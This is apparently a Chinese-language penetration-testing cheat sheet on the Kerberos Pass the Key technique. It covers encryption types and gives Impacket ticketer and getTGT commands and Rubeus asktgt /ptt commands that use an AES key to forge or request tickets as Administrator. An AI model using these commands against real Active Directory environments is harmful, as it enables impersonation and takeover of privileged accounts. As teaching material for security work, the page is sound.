# 哈希 - Pass The Key（密钥传递）

Pass The Key 允许攻击者通过使用有效的会话密钥而非用户密码或 NTLM 哈希来获取系统访问权限。此技术与其他基于凭据的攻击（如哈希传递 PTH 和票据传递 PTT）相关，但专门使用会话密钥进行身份验证。

预身份验证要求请求用户提供密钥，该密钥从其密码派生，可使用 DES、RC4、AES128 或 AES256 等加密算法。

* **RC4**：ARCFOUR-HMAC-MD5 (23)，此格式即为 NTLM 哈希，前往 **哈希传递** 直接使用，前往 **Over Pass The Hash** 页面从中请求 TGT。
* **DES**：DES3-CBC-SHA1 (16)，不应再使用，自 2018 年起已弃用（[RFC 8429](https://www.rfc-editor.org/rfc/rfc8429)）。
* **AES128**：AES128-CTS-HMAC-SHA1-96 (17)，两种 AES 加密算法都可以与 Impacket 和 Rubeus 工具一起使用。
* **AES256**：AES256-CTS-HMAC-SHA1-96 (18)

过去有更多的加密方法，现在已被弃用。

| 加密类型 | 弱？ | krb5 | Windows |
| -------------------------- | ---- | ------ | ------- |  
| des-cbc-crc                | 弱 | <1.18  | >=2000  |
| des-cbc-md4                | 弱 | <1.18  | ?       |
| des-cbc-md5                | 弱 | <1.18  | >=2000  |
| des3-cbc-sha1              |    | >=1.1  | 无      |
| arcfour-hmac               |    | >=1.3  | >=2000  |
| arcfour-hmac-exp           | 弱 | >=1.3  | >=2000  |
| aes128-cts-hmac-sha1-96    |    | >=1.3  | >=Vista |
| aes256-cts-hmac-sha1-96    |    | >=1.3  | >=Vista |
| aes128-cts-hmac-sha256-128 |    | >=1.15 | 无      |
| aes256-cts-hmac-sha384-192 |    | >=1.15 | 无      |
| camellia128-cts-cmac       |    | >=1.9  | 无      |
| camellia256-cts-cmac       |    | >=1.9  | 无      |

Microsoft Windows 从 Windows 7 及更高版本默认禁用单 DES 加密类型。

可以使用 AES 密钥通过 `ticketer` 生成票据，或使用 Impacket 的 `getTGT.py` 脚本请求新的 TGT。

## 生成新票据

* [fortra/impacket/ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

    ```powershell
    impacket-ticketer -aesKey 2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 -domain lab.local Administrator -domain-sid S-1-5-21-2218639424-46377867-3078535060
    ```

## 请求 TGT

* [fortra/impacket/getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)

    ```powershell
    impacket-getTGT -aesKey 2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 lab.local
    ```

* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

    ```powershell
    .\Rubeus.exe asktgt /user:Administrator /aes128 bc09f84dcb4eabccb981a9f265035a72 /ptt
    .\Rubeus.exe asktgt /user:Administrator /aes256:2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 /opsec /ptt
    ```

## 参考资料

* [MIT Kerberos Documentation - Encryption types](https://web.mit.edu/kerberos/krb5-1.18/doc/admin/enctypes.html)
